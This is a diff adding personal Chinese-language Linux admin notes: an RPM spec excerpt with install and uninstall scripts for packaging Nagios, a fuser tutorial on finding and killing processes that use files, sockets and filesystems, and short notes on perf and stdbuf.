+%dir %{_checkresultdir}
+%dir %{_libexecdir}
+%dir %{_plugindir}
+*rpm安装前执行动作*
+%pre 
+/usr/bin/getent group %{nsgrp} >/dev/null || /usr/sbin/groupadd %{nsgrp} 2>&1
+/usr/bin/getent group %{cmdgrp} >/dev/null || /usr/sbin/groupadd %{cmdgrp} 2>&1
+/usr/bin/id %{nsusr} >/dev/null 2>&1 || \
+    /usr/sbin/useradd -r -d %{_prefix} -s /bin/sh -c "%{nsusr}" %{nsusr} -G %{nsgrp},%{cmdgrp} || \
+    %nnmmsg Unexpected error adding user "%{nsusr}". Aborting install process.
+
+*rpm安装后执行的脚本*
+%post
+chown -R nagios:nagios %{_prefix}
+/sbin/chkconfig --add nagios
+/sbin/service nagios start > /dev/null 2>&1
+*rpm卸载前执行的脚本*
+%preun
+*$1代表动作 0:卸载 1:安装 2:升级*
+if [ $1 = 0 ]; then
+    :
+    /sbin/service nagios stop > /dev/null 2>&1
+    /sbin/chkconfig --del nagios
+fi
+*rpm卸载后执行的脚本*
+%postun
+
+if [ $1 = 0 ]; then
+    echo "postun...">> /tmp/yxf.txt
+    /bin/grep '^%{nsusr}:' /etc/passwd > /dev/null 2>&1 && /usr/sbin/userdel %{nsusr} || %nnmmsg "User %{nsusr} could not be deleted."
+    /bin/grep '^%{nsgrp}:' /etc/group > /dev/null 2>&1 && /usr/sbin/groupdel %{nsgrp} || %nnmmsg "Group %{nsgrp} could not be deleted."
+    /bin/grep '^%{cmdgrp}:' /etc/group > /dev/null 2>&1 && /usr/sbin/groupdel %{cmdgrp} || %nnmmsg "Group %{cmdgrp} could not be deleted."
+    rm -rf %{_prefix}
+fi
+%changelog
+...
+#+end_example
+
+* fuser
+** 查询文件和目录使用者
+fuser最基本的用法是查询某个文件或目录被哪个进程使用：
+#+begin_example
+ # fuser /root
+ /root:               17923c 24869c
+#+end_example
+以上命令查询了/root目录被哪些进程使用，输出包含进程的PID以及字符’c’。字符’c’指示了进程的工作目录，使用以下命令可进行验证：
+#+begin_example
+ # ls -l /proc/17923/cwd
+ lrwxrwxrwx 1 root root 0 Apr 19 09:02 /proc/17923/cwd -> /root
+#+end_example 
+
+PID后跟的字符说明了进程以何种方式与该目录/文件关联，有以下关联方式：
+　　c  指示进程的工作目录
+　　e  指示该文件为进程的可执行文件(即进程由该文件拉起)
+　　f  指示该文件被进程打开，默认情况下f字符不显示
+　　F  指示该文件被进程打开进行写入，默认情况下F字符不显示
+　　r  指示该目录为进程的根目录
+　　m  指示进程使用该文件进行内存映射，抑或该文件为共享库文件，被进程映射进内存
+
+使用-v选项将显示更全的信息：
+#+begin_example
+ # fuser -v /root
+             USER     PID    ACCESS   COMMAND
+ /root:      root    17923    ..c..      bash
+             root    24869    ..c..      atop
+#+end_example
+
+下面我们使用一个端口监听的例子，来看可执行文件、socket端口使用进程的信息查询。
+#+begin_example
+ # ./socket &
+#+end_example
+以上socket程序是一个使用C编写的小程序，起一个TCP服务端，监听9999端口，代码请查附件。
+
+执行完该程序时候，我们使用fuser进行查询：
+#+begin_example
+# fuser -v socket
+             USER    PID   ACCESS   COMMAND
+socket:    root    11861    ...e.   socket
+#+end_example
+可以看到PID为11861与socket文件的关联方式为'e'，与上表所列相符。
+ 
+** 查询socket使用者
+除了查询文件、目录的相关使用进程，我们还可以对socket端口的使用者进行查询。还是使用上面socket程序，我们对端口9999进行如下查询：
+#+begin_example
+ # fuser -v -n tcp 9999
+               USER     PID    ACCESS   COMMAND
+ 9999/tcp:     root     11861   F....    socket
+#+end_example
+  查询使用UDP 2007端口的进程
+  fuser -n udp 2007
+
+** 查询文件系统使用者
+针对某文件系统的使用者，我们可以使用-m参数进行查询，对于以下分区的系统：
+#+begin_example
+ # df
+ Filesystem           1K-blocks      Used     Available Use%  Mounted on
+ /dev/sda2           15735128   10218084   5517044  65%  /
+ udev                  4091824        168    4091656   1%  /dev
+ /dev/sda3           47550928   43836764   3714164  93%  /home1
+ /dev/sdb2           70627600   64344256   6283344  92%  /home2
+#+end_example
+执行以下查询命令：
+#+begin_example
+ # fuser -m /home1
+ /home1:               2703ce
+#+end_example
+可以看到/dev/sda3分区的使用者为2703对应的进程，执行fuser –m /dev/sda3、fuser –m /home1/test将得到相同的结果。
+** 使用fuser关闭进程
+除了可以使用fuser进行查询之外，fuser还可以向进程发送信号，让进程退出：
+#+begin_example
+# fuser -v -k socket
+             USER    PID   ACCESS   COMMAND
+socket:      root  11861    ...e.    socket
+ 
+[1]+  Killed                  ./socket
+#+end_example
+-k选项表示向使用socket文件的相关进程发送SIGKILL信号。除了发送SIGKILL信号之外，fuser还可以发送以下信号：
+#+begin_example
+ # fuser -l /home
+ HUP INT QUIT ILL TRAP ABRT IOT BUS FPE KILL USR1 SEGV USR2 PIPE ALRM TERM
+ STKFLT CHLD CONT STOP TSTP TTIN TTOU URG XCPU XFSZ VTALRM PROF WINCH IO PWR SYS
+ UNUSED
+#+end_example 
+
+另外，加上-i选项，在KILL进程时，需要人为地进行确认：
+#+begin_example
+ # fuser -v -k -i socket
+             USER    PID   ACCESS   COMMAND
+ socket:     root   11861  ...e.     socket
+ Kill process 11861 ?(y/N)
+#+end_example
+* perf
+ perf top -p pid
+ 可以看到各个函数cpu占用情况
+
+* stdbuf 命令
+  可以关闭buffer
